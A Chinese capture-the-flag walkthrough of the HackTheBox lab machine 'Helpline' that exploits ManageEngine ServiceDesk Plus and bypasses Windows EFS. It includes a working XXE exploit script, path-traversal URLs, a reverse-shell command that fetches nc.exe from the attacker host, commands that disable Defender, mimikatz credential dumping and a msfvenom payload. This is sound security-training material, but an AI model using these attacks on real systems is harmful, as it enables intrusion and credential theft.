Helpline是一个困难的靶机，知识点涉及EFS解密和ME
SDP的多个漏洞，包括XXE漏洞、LFI\任意文件下载漏洞、身份认证绕过漏洞以及远程代码执行漏洞等。感兴趣的同学可以在HackTheBox中进行学习。![截屏2021-12-20
下午4.20.17](https://image.3001.net/images/20220406/1649259370_624db36ac84fec7dbaa96.png!small)

 _通关思维导图_  
![Helpline](https://image.3001.net/images/20220406/1649259373_624db36dafeb54264045f.png!small)

## 0x01 侦查

### 端口探测

首先使用nmap进行端口扫描

    
    
    nmap -Pn -p- -sV -sC -A 10.10.10.132 -oA nmap_Helpline
    

![截屏2021-12-21
下午2.20.22](https://image.3001.net/images/20220406/1649259375_624db36f8f0db1fa1ad35.png!small)  
![截屏2021-12-21
下午2.21.05](https://image.3001.net/images/20220406/1649259378_624db37295e924d40f6f6.png!small)  
扫描结果显示目前靶机开放了135、445、5985、8080以及49667端口

#### 445端口

使用 smbclient 和 smbmap 查看默认共享，结果显示访问被拒绝

    
    
    smbclient -N -L //10.10.10.132
    smbmap -H 10.10.10.132 -v
    

![截屏2021-12-21
下午4.55.26](https://image.3001.net/images/20220406/1649259382_624db3764668df7491107.png!small)

#### 8080端口

访问后是一个 ManageEngine ServiceDesk Plus 站点，版本为 9.3  
![截屏2021-12-21
下午4.58.00](https://image.3001.net/images/20220406/1649259383_624db37788a387595dd01.png!small)

在 ManageEngine ServiceDesk Plus 存在两个默认账户

    
    
    administrator/administrator
    guest/guest
    

administrator无法登陆，尝试登陆 guest 账户可成功进入应用，  
![截屏2021-12-21
下午5.26.34](https://image.3001.net/images/20220406/1649259385_624db379bf9935736d7f8.png!small)

在`Solution`选项卡中可以看到`Password Audit`  
![截屏2021-12-21
下午5.31.39](https://image.3001.net/images/20220406/1649259387_624db37b7f14443165aed.png!small)

点进去后发现存在一个 excel 表格  
![截屏2021-12-21
下午5.33.00](https://image.3001.net/images/20220406/1649259388_624db37ca2bb9585bf93c.png!small)

下载打开后只有三个表  
![截屏2021-12-21
下午5.35.00](https://image.3001.net/images/20220406/1649259389_624db37dd7e5e397589c8.png!small)

通过 binwalk 分解该表格发现其中其实存在四张表，说明原来有一张表被隐藏了

    
    
    binwalk -e Password+Audit.xlsx
    

![截屏2021-12-21
下午9.12.32](https://image.3001.net/images/20220406/1649259391_624db37f9e9fef67ef06d.png!small)

选择工作表右键，点击取消隐藏发现`Password Data`工作表  
![截屏2021-12-21
下午9.28.46](https://image.3001.net/images/20220406/1649259395_624db383312eb1de1f523.png!small)

![截屏2021-12-21
下午9.28.56](https://image.3001.net/images/20220406/1649259396_624db3844812eb1cb50f0.png!small)

在该表格中包含一些密码和文件路径`C:\temp\Password Audit\it_logins.txt`，在路径对应的文件中可能包含一些登录信息  
![截屏2021-12-21
下午9.29.19](https://image.3001.net/images/20220406/1649259397_624db38585a37445f7fa8.png!small)

## 0x02 上线[system]

### ME SDP 漏洞

ManageEngine ServiceDesk Plus 的9.3版本存在许多漏洞，下面将利用这些漏洞来对该应用进行攻击

#### XXE漏洞（CVE-2017-9362）

在 CMDB API 中的 INPUT_DATA 字段中添加 CI 时会造成 XML 外部实体注入攻击，攻击者可在发送数据时将任何系统文件包含到
payload 当中，根据该漏洞可编写脚本如下：

    
    
    import requests
    import sys
    
    xxe = """<!DOCTYPE foo [<!ENTITY xxe15d41 SYSTEM "file:///{filepath}"> ]><API version='1.0' locale='en'>
        <records>
            <record>
                <parameter>
                    <name>CI Name</name>
                    <value>Tomcat Server 3 0xdfstart&ampxxe15d410xdfstop</value>
                </parameter>
            </record>
        </records>
    </API>
    """
    
    
    def get_file(ip_address, filepath):
        login_url = "http://"+ip_address+":8080/j_security_check"
        api_url = "http://"+ip_address+":8080/api/cmdb/ci"
        login_data={"j_username": "guest", "j_password": "guest", "LDAPEnable": "false", "hidden": "Select a Domain", "hidden": "For Domain", "AdEnable": "false", "DomainCount": "0", "LocalAuth": "No", "LocalAuthWithDomain": "No", "dynamicUserAddition_status": "true", "localAuthEnable": "true", "logonDomainName": "-1", "loginButton": "Login", "checkbox": "checkbox"}
    
        with requests.Session() as s:
            s.post(login_url, data=login_data)
            xxe_data={"OPERATION_NAME": "add", "INPUT_DATA": xxe.format(filepath=filepath)}
            response = s.post(api_url, data=xxe_data)
            try:
                    print(response.text[response.text.index("0xdfstart") + len("0xdfstart"):response.text.index("0xdfstop")].replace("\\r\\n","\n"))
            except ValueError:
                print("Error: No data returned")
    
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} [ip] [filepath]\nfilepath can be file on target, or smb or http uri")
        sys.exit(1)
    get_file(sys.argv[1],sys.argv[2].replace("\\", "/"))
    

尝试获取`win.ini`，能够成功读取`win.ini`

    
    
    python3 xxe.py 10.10.10.132 "C:\windows\win.ini"
    

![截屏2021-12-22
下午4.33.20](https://image.3001.net/images/20220406/1649259398_624db38699f11ad0fc5a6.png!small)

尝试读取以上的密码文件中的密码

    
    
    python3 xxe.py 10.10.10.132 "C:\temp\Password Audit\it_logins.txt"
    

![截屏2021-12-22
下午5.03.17](https://image.3001.net/images/20220406/1649259399_624db3878d588f3fb549b.png!small)  
成功拿到账号密码为`alice/$sys4ops@megabank!`

#### 任意文件下载（CVE-2017-11511）

除了XXE漏洞以外，ME SDP
9.3由于对下载文件的URL路径名限制不当，因此还存在任意文件下载漏洞。攻击者可通过`..\`进行目录穿越下载目标文件。与请求C盘的 win.ini
不同，在报错信息中则显示 ME SDP
安装在E盘。尝试获取其备份文件的日志信息，默认访问路径为`E:\ManageEngine\ServiceDesk\bin\SDPbackup.log`

    
    
    http://10.10.10.132:8080/fosagent/repl/download-file?basedir=4&filepath=\..\..\..\..\..\..\manageengine\servicedesk\bin\sdpbackup.log
    

![截屏2021-12-25
下午5.53.40](https://image.3001.net/images/20220406/1649259400_624db3888ffd194c5ef2e.png!small)

在日志中记录了组成数据库备份文件的具体位置，文件名分别如下：

    
    
    backup_postgres_9309_fullbackup_04_12_2019_17_43_part_1.data
    backup_postgres_9309_fullbackup_04_12_2019_17_43_part_2.data
    

使用 wget 通过任意文件下载漏洞把它们下载下来

    
    
    wget "http://10.10.10.132:8080/fosagent/repl/download-file?basedir=4&filepath=\..\..\..\..\..\..\manageengine\servicedesk\backup\backup_postgres_9309_fullbackup_03_08_2019_09_04\backup_postgres_9309_fullbackup_03_08_2019_09_04_part_1.data"
    wget "http://10.10.10.132:8080/fosagent/repl/download-file?basedir=4&filepath=\..\..\..\..\..\..\manageengine\servicedesk\backup\backup_postgres_9309_fullbackup_03_08_2019_09_04\backup_postgres_9309_fullbackup_03_08_2019_09_04_part_2.data"
    

![截屏2021-12-25
下午6.18.07](https://image.3001.net/images/20220406/1649259402_624db38a02926821826cb.png!small)

解压下载后发现其中包含许多 SQL 文件

    
    
    unzip backup_postgres_9309_fullbackup_03_08_2019_09_04_part_1.data
    unzip backup_postgres_9309_fullbackup_03_08_2019_09_04_part_2.data
    

![截屏2021-12-25
下午6.27.24](https://image.3001.net/images/20220406/1649259405_624db38d3720267b83165.png!small)

在`aaapassword.sql`和`aaalogin.sql`中存在我们需要的账户名以及哈希值  
![截屏2021-12-25
下午6.30.53](https://image.3001.net/images/20220406/1649259408_624db390ba5ae95a7e0b2.png!small)

经过整理后哈希值如下且哈希类型为`bcrypt`

    
    
    $2a$12$6VGARvoc/dRcRxOckr6WmucFnKFfxdbEMcJvQdJaS5beNK0ci0laG
    $2a$12$2WVZ7E/MbRgTqdkWCOrJP.qWCHcsa37pnlK.0OyHKfd4lyDweMtki
    $2a$12$Em8etmNxTinGuub6rFdSwubakrWy9BEskUgq4uelRqAfAXIUpZrmm
    $2a$12$hmG6bvLokc9jNMYqoCpw2Op5ji7CWeBssq1xeCmU.ln/yh0OBPuDa
    $2a$12$6sw6V2qSWANP.QxLarjHKOn3tntRUthhCrwt7NWleMIcIN24Clyyu
    $2a$12$X2lV6Bm7MQomIunT5C651.PiqAq6IyATiYssprUbNgX3vJkxNCCDa
    $2a$12$gFZpYK8alTDXHPaFlK51XeBCxnvqSShZ5IO/T5GGliBGfAOxwHtHu
    $2a$12$4.iNcgnAd8Kyy7q/mgkTFuI14KDBEpMhY/RyzCE4TEMsvd.B9jHuy
    

bcrypt 函数的输入是密码字符串（最多 72 个字节）、一个数字成本和一个 16 字节（128 位）的盐值。盐通常是一个随机值。它使用这些输入来计算
24 字节（192 位）散列。最终输出以下形式的字符串：

    
    
    $2<a/b/x/y>$[cost]$[22 字符盐][31 字符哈希]
    

例如：输入密码abc123xyz、成本12和随机盐，bcrypt 的输出是字符串

    
    
    $2a$12$R9h/cIPz0gi.URNNX3kh2OPST9/PgBkqquzi.Ss7KIUgO2t0jWMUW
    \__/\/ \____________________/\_____________________________/
    Alg 成本盐哈希
    

幸运的是，我们可以使用 hashcat 进行破解

    
    
    hashcat -m 3200 hashes /usr/share/wordlists/rockyou.txt --force
    

![截屏2021-12-25
下午7.19.05](https://image.3001.net/images/20220406/1649259411_624db393824a25979768f.png!small)

最终成功破解后三个密码，与用户名组合后整理如下：

    
    
    zachary_33258/0987654321
    fiona/1q2w3e4r
    mary/1234567890
    

#### 身份验证绕过

除了通过 guest 账户登录应用外，我们还可以通过`/mc`目录来绕过 administrator 的登录验证。

首先访问`/mc`目录并注销已经登陆的 guest 账户  
![截屏2021-12-25
下午7.44.27](https://image.3001.net/images/20220406/1649259414_624db396b0236bbd2a31e.png!small)

输入账号密码均为 administrator，其实密码任意输入也没关系，但用户名不能发生变化  
![截屏2021-12-25
下午7.44.57](https://image.3001.net/images/20220406/1649259415_624db397ebc02f347674b.png!small)

成功登录目标系统  
![截屏2021-12-25
下午7.46.58](https://image.3001.net/images/20220406/1649259417_624db3992c71cb68e319f.png!small)

在 0xdf 大神的博客中讲述多条线路进行突破，分别是在 kali 下运用 administrator 账户获取 system 权限以及在 Windows
下使用之前获取的 Alice 用户通过 WinRM 进行权限提升，相比 Windows 下的操作，我更喜欢使用 kali 来完成

### 远程命令执行

通过权限绕过我们已经拿到了管理员用户，在`Admin`管理模块上存在`Custom Triggers`远程命令执行漏洞  
![截屏2021-12-26
上午2.36.23](https://image.3001.net/images/20220406/1649259418_624db39a8f855ce2e97cd.png!small)

点击`Add New Action`设置新的触发器  
![截屏2021-12-26
上午2.37.32](https://image.3001.net/images/20220406/1649259420_624db39ca428439d8ee37.png!small)

在`Action`中设置触发器脚本，将触发优先级设置为高并设置用于反弹shell的脚本命令

    
    
    cmd /c powershell iwr -uri 10.10.14.4/nc64.exe -outfile c:\windows\system32\spool\drivers\color\nc.exe; c:\windows\system32\spool\drivers\color\nc.exe -e cmd.exe 10.10.14.4 443
    

![截屏2021-12-26
上午3.14.32](https://image.3001.net/images/20220406/1649259422_624db39e8ef20f357f8d3.png!small)

保存完成后在本地监听 443 端口

    
    
    nc -nvlp 443
    

与此同时开启 http 服务

    
    
    python -m Simple HTTPServer 80
    

在请求页面中新建请求并将优先级设置为高  
![截屏2021-12-26
上午3.37.38](https://image.3001.net/images/20220406/1649259423_624db39fc41cc1e208de1.png!small)

请求运行后查看本地监听发现已返回 system 权限  
![截屏2021-12-26
上午3.41.07](https://image.3001.net/images/20220406/1649259425_624db3a105057bec0dbfd.png!small)

## 0x03 突破EFS

Windows 上的加密文件系统( EFS )是NTFS 3.0
版中引入的一项功能，可提供文件系统级加密。该技术使文件能够被透明地加密，以保护机密数据免受对计算机进行物理访问的攻击者的侵害。

EFS 加密解密都是透明完成, 如果用户加密了一些数据, 那么其对这些数据的访问将是完全允许的,
并不会受到任何限制。而其他非授权用户试图访问加密过的数据时, 就会收到“拒绝访问”的错误提示。

与一般的加密软件不同，EFS加密不是靠双击文件，然后弹出一个对话框，然后输入正确的密码来确认的用户的。EFS加密的用户确认工作在登录到 Windows
时就已经进行了，不需要提供额外的密码。只有使用适当的账户登录，才能打开相应的加密文件。所以解密 EFS 的核心就是如何获取到对应用户的身份凭证。

### 用户进程突破EFS

#### 日志信息收集

虽然拿到了系统权限，但是flag都经过 EFS 加密，因此导致我们无法读取。

    
    
    type c:\Users\Administrator\Desktop\root.txt
    

![截屏2021-12-26
上午4.02.23](https://image.3001.net/images/20220406/1649259426_624db3a249d5d13ed3fe9.png!small)

尝试上传 mimikatz 进行密码破解，但是无法执行

    
    
    cd c:\windows\system32\spool\drivers\color\
    powershell iwr -uri 10.10.14.4/mimikatz.exe -outfile m.exe
    .\m.exe
    

![截屏2021-12-26
上午4.15.23](https://image.3001.net/images/20220406/1649259427_624db3a387073b5e8cc6c.png!small)

这是因为它已经被 Windows Defender 所隔离，我们可以制作免杀mimikatz或禁用 Windows
Defender，在这里我选择了后者。（话说免杀 mimikatz 也不难，有手就行）

    
    
    powershell Set-MpPreference -DisableRealtimeMonitoring $true
    powershell iwr -uri 10.10.14.4/mimikatz.exe -outfile m.exe
    .\m.exe
    

![截屏2021-12-26
上午4.18.19](https://image.3001.net/images/20220406/1649259428_624db3a4a04c6fd566e3a.png!small)

继续运行它获取密码，但是结果还是显示报错

    
    
    privilege::debug
    sekurlsa::logonpasswords
    

![截屏2021-12-26
上午4.20.44](https://image.3001.net/images/20220406/1649259429_624db3a5f2a73d42699c8.png!small)

这个问题已经在 GitHub 中得到了反馈，解决方法是我们需要一个老版本的猕猴桃来完成上传

    
    
    powershell iwr -uri 10.10.14.4/mimikatz2.exe -outfile m2.exe
    .\m.exe
    

下载一个老版本 mimikatz 并运行

    
    
    privilege::debug
    lsadump::sam
    

![截屏2021-12-26
上午5.37.20](https://image.3001.net/images/20220406/1649259431_624db3a77ff747c5dfc99.png!small)

通过整理后发现以下用户及其对应的 NTLM 哈希值

    
    
    Administrator
    Guest
    alice
    zachary
    leo
    niels
    tolu
    

其中唯一可以破解成功的是`zachary/0987654321`，但是该用户并非管理员权限

    
    
    net user zachary
    

![截屏2021-12-26
上午5.41.58](https://image.3001.net/images/20220406/1649259434_624db3aa74396f4f193bb.png!small)

继续查询发现该用户位于日志权限读取组中，据此推测日志中可能会会有存密码，尝试查询日志

    
    
    wevtutil qe security /rd:true /f:text /r:helpline /u:HELPLINE\zachary /p:0987654321 > eventlog.txt 
    type eventlog.txt | findstr tolu
    

![截屏2021-12-26
上午5.43.31](https://image.3001.net/images/20220406/1649259436_624db3ac720026e766f17.png!small)

在日志中发现泄漏的账号密码为`tolu/!zaq1234567890pl!99`，同时该用户还是管理员权限  
![截屏2021-12-26
上午5.43.46](https://image.3001.net/images/20220406/1649259438_624db3aee82d30117ba85.png!small)  
日志文件中出现用户名和密码。这就说明该用户可能已经登陆，借助 MSF 可注入该用户进程

#### MSF进程注入

使用 msfvenom 生成 exe 类型木马

    
    
    msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.14.4 lport=4444 -f exe -o msf.exe
    

![截屏2021-12-26
下午4.53.17](https://image.3001.net/images/20220406/1649259441_624db3b117457eeb588cb.png!small)

在本地开启 smb 共享并设置账号密码

    
    
    python3 smbserver.py -smb2support -username mac -password mac share /root/hackthebox/Machines/Helpline
    

![截屏2021-12-26
下午4.52.53](https://image.3001.net/images/20220406/1649259442_624db3b2530e065bc93c2.png!small)

在本地设置 msf 监听

    
    
    msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.14.4; set lport 4444; exploit -j;"
    

![截屏2021-12-26
下午5.04.45](https://image.3001.net/images/20220406/1649259443_624db3b3bdbf9f35206f4.png!small)

通过 smb 共享来运行该执行程序

    
    
    net use \\10.10.14.4\share /u:mac mac
    \\10.10.14.4\share\msf.exe
    

![截屏2021-12-26
下午5.06.02](https://image.3001.net/images/20220406/1649259445_624db3b5809dffb08129a.png!small)

成功收到 meterpreter 会话，查看进程

    
    
    meterpreter > ps
    

![截屏2021-12-26
下午5.13.12](https://image.3001.net/images/20220406/1649259447_624db3b713b3a9a5d7f24.png!small)

但是其中只发现了`leo`的进程，并没有发现`tolu`的进程，难道又是哪出现了问题？所幸查询了`leo`用户权限后发现`leo`也是管理员权限，话不多说直接注入该用户的`explorer.exe`进程

    
    
    meterpreter > migrate 4584
    

![截屏2021-12-26
下午5.16.50](https://image.3001.net/images/20220406/1649259450_624db3ba4c179d65b4267.png!small)

在该用户桌面上发现密码文件`admin-passs.xml`，根据文件名猜测可能是 administrator 的密码

    
    
    meterpreter > load_powershell
    meterpreter > powershell_shell
    PS > cd C:\Users\leo\Desktop
    PS > ls
    

![截屏2021-12-26
下午5.19.04](https://image.3001.net/images/20220406/1649259451_624db3bb6bb6903849b87.png!small)

但是密码显示为密文，我们尝试通过 poweshell 将其转换为 administrator 的登陆凭证

    
    
    PS > type admin-pass.xml
    PS > $s = cat admin-pass.xml
    PS > $ss = Convertto-securestring -string $s
    PS > $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist "administrator", $ss
    PS > $cred.GetNetWorkCredential().password
    

![截屏2021-12-26
下午5.27.20](https://image.3001.net/images/20220406/1649259453_624db3bd0d274df71f78c.png!small)

成功读取到密码为`mb@letmein@SERVER#acc`，既然有了 administrator
的凭证，尝试读取其桌面下的`root.txt`，但还是显示报错

    
    
    PS > Invoke-Command -ScriptBlock { whoami } -Credential $cred -Computer localhost
    PS > Invoke-Command -ScriptBlock { type C:\Users\Administrator\Desktop\root.txt } -Credential $cred -Computer localhost
    

![截屏2021-12-26
下午5.31.59](https://image.3001.net/images/20220406/1649259454_624db3be9b147d8cf6ac5.png!small)

通过`-auth CredSSP`来进行认证，从而绕过 EFS 并成功读取到flag

    
    
    PS > Invoke-Command -ScriptBlock { type C:\users\administrator\desktop\root.txt } -Credential $cred -Computer localhost -auth credssp
    

![截屏2021-12-26
下午5.51.38](https://image.3001.net/images/20220406/1649259455_624db3bfb63fc66af4b10.png!small)

### 证书解密EFS

 **揭秘EFS指南：https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files**  
解密 EFS 文件可根据 mimikatz
中的指南来进行操作。根据指南我们首先需要获取用户的公钥证书以及对应密钥，证书地址位于用户目录的`AppData\Roaming\Microsoft\SystemCertificates\My\Certificates`，使用
mimikatz 可获取公钥证书信息并保存为 der
文件，同时可发现对应密钥的容器；密钥地址位于用户目录的`AppData\Roaming\Microsoft\Crypto\RSA`，使用 mimikatz
可获取私钥信息并从中找到生成该密钥的主密钥名；主密钥位于用户目录的`\Users\Administrator\AppData\Roaming\Microsoft\Protect\`，以发现密钥容器ID为路径可在其中找到用于生成以上密钥的主密钥；使用
mimikatz 借助 administrator 账户的密码解密主密钥，生成的 key 以及 sha1 就是主密钥的值；之后使用 mimikatz
封装私钥为 pvk 文件，将作为公钥的 der 文件和作为私钥的 pvk 文件传入本地，在本地使用 openssl 转换为 pem 格式并最终生成 pfx
文件，将 pfx 安装至靶机当中即可获取到对应的权限，从而完成 EFS 解密

#### 读取root.txt

切换到 system 用户寻找 administrator
用户的公钥证书，在目标路径下拿到公钥为`FB154575993A250FE826DBAC79EF26C211CB77B3`

    
    
    cd C:\Users\administrator\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates
    dir /a /b
    

![截屏2021-12-26
下午5.56.49](https://image.3001.net/images/20220406/1649259456_624db3c0ac48349ecc89c.png!small)

使用 mimikatz
可获取证书信息并保存，同时发现密钥的容器为`3dd3e213-bce6-4acb-808c-a1b3227ecbde`，但是一般情况下容器ID并不会指向密钥

    
    
    crypto::system /file:"C:\Users\Administrator\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\FB154575993A250FE826DBAC79EF26C211CB77B3" /export
    

![截屏2021-12-26
下午5.59.55](https://image.3001.net/images/20220406/1649259457_624db3c1f1c929740e8f4.png!small)

在目录`C:\Users\Administrator\AppData\Roaming\Microsoft\Crypto\RSA`中尝试获取私钥，发现一个容器ID为`S-1-5-21-3107372852-1132949149-763516304-500`，其中可能存放着私钥文件

    
    
    cd C:\Users\Administrator\AppData\Roaming\Microsoft\Crypto\RSA
    dir /a /b
    

![截屏2021-12-26
下午6.04.56](https://image.3001.net/images/20220406/1649259460_624db3c462c0e652f54bc.png!small)

继续探索发现隐藏的密钥文件`d1775a874937ca4b3cd9b8e334588333_86f90bf3-9d4c-47b0-bc79-380521b14c85`

    
    
    cd S-1-5-21-3107372852-1132949149-763516304-500
    dir /a /b
    

![截屏2021-12-26
下午6.05.51](https://image.3001.net/images/20220406/1649259461_624db3c559eeded06647e.png!small)

使用 mimikatz 查看对应的私钥，该私钥由主密钥`9e78687d-d881-4ccb-8bd8-bc0a19608687`生成

    
    
    dpapi::capi /in:"C:\Users\Administrator\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-3107372852-1132949149-763516304-500\d1775a874937ca4b3cd9b8e334588333_86f90bf3-9d4c-47b0-bc79-380521b14c85"
    

![截屏2021-12-26
下午6.09.07](https://image.3001.net/images/20220406/1649259462_624db3c6c9ec5641d5f5e.png!small)

根据目录`C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\`和获取到的容器`S-1-5-21-3107372852-1132949149-763516304-500`找到加密的主密钥`9e78687d-d881-4ccb-8bd8-bc0a19608687`

    
    
    cd C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-3107372852-1132949149-763516304-500
    dir /a
    

![截屏2021-12-26
下午6.12.33](https://image.3001.net/images/20220406/1649259465_624db3c958f05cd5e9a2f.png!small)

使用 mimikatz 通过 administrator
的密码来解密主密钥`9e78687d-d881-4ccb-8bd8-bc0a19608687`，解密成功后生成的 key、sha1 就是主密钥的值

    
    
    dpapi::masterkey /in:"C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-3107372852-1132949149-763516304-500\9e78687d-d881-4ccb-8bd8-bc0a19608687" /password:mb@letmein@SERVER#acc
    

![截屏2021-12-26
下午6.16.59](https://image.3001.net/images/20220406/1649259467_624db3cb4745e4d1b573c.png!small)

使用 mimikatz 将私钥封装为 pvk 文件

    
    
    dpapi::capi /in:"C:\Users\Administrator\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-3107372852-1132949149-763516304-500\d1775a874937ca4b3cd9b8e334588333_86f90bf3-9d4c-47b0-bc79-380521b14c85"
    

![截屏2021-12-26
下午6.24.56](https://image.3001.net/images/20220406/1649259469_624db3cdeff98a4cbf20c.png!small)

将私钥生成的 pvk 与公钥生成的 der 文件通过 smb 共享复制到本地

    
    
    net use \\10.10.14.4\share /u:mac mac
    copy \windows\system32\spool\drivers\color\raw_exchange_capi_0_3dd3e213-bce6-4acb-808c-a1b3227ecbde.pvk \\10.10.14.4\share\
    copy \windows\system32\spool\drivers\color\FB154575993A250FE826DBAC79EF26C211CB77B3.der \\10.10.14.4\share\
    

![截屏2021-12-26
下午6.30.02](https://image.3001.net/images/20220406/1649259473_624db3d1a745d0c3cb771.png!small)

利用 openssl 将拿到的 pvk 以及 der 导出为 pem 格式，通过它们生成 pfx 文件，里面存储了 adminisrator
的私钥以及与之有关的证书链

    
    
    openssl x509 -inform DER -outform PEM -in FB154575993A250FE826DBAC79EF26C211CB77B3.der -out public.pem
    openssl rsa -inform PVK -outform PEM -in raw_exchange_capi_0_3dd3e213-bce6-4acb-808c-a1b3227ecbde.pvk  -out private.pem
    openssl pkcs12 -in public.pem -inkey private.pem -password pass:mac -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
    

![截屏2021-12-26
下午6.33.14](https://image.3001.net/images/20220406/1649259476_624db3d41d5db614d1c1f.png!small)

通过 smb 共享将生成的 pfx 文件放回靶机当中并安装

    
    
    copy \\10.10.14.4\share\cert.pfx \windows\system32\spool\drivers\color\cert.pfx
    certutil -user -p mac -importpfx \windows\system32\spool\drivers\color\cert.pfx NoChain,NoRoot
    

![截屏2021-12-26
下午6.46.07](https://image.3001.net/images/20220406/1649259478_624db3d650cd45d2bbd0f.png!small)

安装完成后即可读取`root.txt`

    
    
    type c:\\users\administrator\desktop\root.txt
    

![截屏2021-12-26
下午6.47.49](https://image.3001.net/images/20220406/1649259479_624db3d78b4cd111dd968.png!small)

#### 读取user.txt

在 tolu 用户的桌面上我们可以发现 user.txt

    
    
    dir c:\Users\tolu\Desktop /b
    

![截屏2021-12-26
下午6.50.11](https://image.3001.net/images/20220406/1649259480_624db3d86b7b3f8961f88.png!small)

同理我们需要解密 tolu 用户的 EFS，首先需要获取公钥证书

    
    
    dir C:\Users\tolu\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates /a /b
    

![截屏2021-12-26
下午6.54.10](https://image.3001.net/images/20220406/1649259481_624db3d9681154b0f7c8c.png!small)

在 mimikatz 中寻找证书信息并导出

    
    
    crypto::system /file:"C:\Users\tolu\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\91EF5D08D1F7C60AA0E4CEE73E050639A669\2\F29" /export
    

![截屏2021-12-26
下午6.56.38](https://image.3001.net/images/20220406/1649259482_624db3daa85ab3eaae45c.png!small)

在目录`C:\Users\tolu\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-3107372852-1132949149-763516304-1011`找到密钥容器`307da0c2172e73b4af3e45a97ef0755b_86f90bf3-9d4c-47b0-bc79-380521b14c85`

    
    
    dir C:\Users\tolu\AppData\Roaming\Microsoft\Crypto\RSA\ /a /b
    dir C:\Users\tolu\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-3107372852-1132949149-763516304-1011 /a /b
    

![截屏2021-12-26
下午7.00.08](https://image.3001.net/images/20220406/1649259485_624db3dd7ac17939f69d6.png!small)

使用 mimikatz 查看对应的私钥，该私钥由主密钥`2f452fc5-c6d2-4706-a4f7-1cd6b891c017`生成

    
    
    dpapi::capi /in:"C:\Users\tolu\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-3107372852-1132949149-763516304-1011\307da0c2172e73b4af3e45a97ef0755b_86f90bf3-9d4c-47b0-bc79-380521b14c85"
    

![截屏2021-12-26
下午7.01.43](https://image.3001.net/images/20220406/1649259486_624db3dec18fb6a297068.png!small)

使用 mimikatz 通过 tolu 的密码来解密主密钥`2f452fc5-c6d2-4706-a4f7-1cd6b891c017`，解密成功后生成的
key、sha1 就是主密钥的值

    
    
    dpapi::masterkey /in:"C:\Users\tolu\AppData\Roaming\Microsoft\Protect\S-1-5-21-3107372852-1132949149-763516304-1011\2f452fc5-c6d2-4706-a4f7-1cd6b891c017" /password:!zaq1234567890pl!99
    

![截屏2021-12-26
下午7.07.22](https://image.3001.net/images/20220406/1649259489_624db3e1728e91c48fa93.png!small)

使用 mimikatz 将私钥封装为 pvk 文件

    
    
    dpapi::capi /in:"C:\Users\tolu\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-3107372852-1132949149-763516304-1011\307da0c2172e73b4af3e45a97ef0755b_86f90bf3-9d4c-47b0-bc79-380521b14c85"
    

![截屏2021-12-26
下午7.10.12](https://image.3001.net/images/20220406/1649259491_624db3e3ccfbe31b983a3.png!small)

将私钥生成的 pvk 与公钥生成的 der 文件通过 smb 共享复制到本地

    
    
    copy \windows\system32\spool\drivers\color\raw_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.pvk \\10.10.14.4\share\
    copy \windows\system32\spool\drivers\color\91EF5D08D1F7C60AA0E4CEE73E050639A669\2\F29.der \\10.10.14.4\share\
    

![截屏2021-12-26
下午7.16.26](https://image.3001.net/images/20220406/1649259494_624db3e6cb6a515d6026a.png!small)

利用 openssl 将拿到的 pvk 以及 der 导出为 pem 格式，通过它们生成 pfx 文件，里面存储了 tolu 的私钥以及与之有关的证书链

    
    
    openssl x509 -inform DER -outform PEM -in 91EF5D08D1F7C60AA0E4CEE73E050639A669\2\F29.der -out public-1.pem
    openssl rsa -inform PVK -outform PEM -in raw_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.pvk  -out private-1.pem
    openssl pkcs12 -in public-1.pem -inkey private-1.pem -password pass:mac -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert-1.pfx
    

![截屏2021-12-26
下午7.22.31](https://image.3001.net/images/20220406/1649259496_624db3e86526eaeb932b1.png!small)

通过 smb 共享将生成的 pfx 文件放回靶机当中并安装

    
    
    copy \\10.10.14.4\share\cert-1.pfx \windows\system32\spool\drivers\color\cert-1.pfx
    certutil -user -p mac -importpfx \windows\system32\spool\drivers\color\cert-1.pfx NoChain,NoRoot
    

![截屏2021-12-26
下午7.24.40](https://image.3001.net/images/20220406/1649259497_624db3e9d2719e2bede96.png!small)

安装完成后可成功读取`user.txt`

    
    
    type c:\\users\tolu\desktop\user.txt
    

![截屏2021-12-26
下午7.28.08](https://image.3001.net/images/20220406/1649259499_624db3eb1089d10118036.png!small)

**总结：** ME SDP存在默认用户guest，通过该用户找到excel文件并从中发现服务器中存在的密码文件路径。由于9.3版本下的 ME SDP
存在多个漏洞，可尝试进行利用获取到更多的信息，首先使用 XXE
可读取到以上密码文件的信息；其次使用任意文件下载漏洞下载对应的备份文件，在其中的SQL文件中发现多个账号密码，通过hashcat解密后成功拿到三个用户密码；然后使用身份认证绕过漏洞将guest用户提至administrator；最后在管理员权限下进入控制面板设置触发器，成功拿到反弹shell。进入靶机后发现当前权限为system，但是因为
EFS 的原因无法直接读取flag。存在两种方式可突破EFS限制，一是注入管理员进程，找到admin-pass.xml，利用其中泄漏的
administrator 密码作为管理员用户凭证，从而读取flag；二是解密EFS，按照mimikatz解密EFS指南获取目标用户的公钥、私钥，制作成
pfx 来作为用户凭证，从而能够突破不同用户的EFS限制。

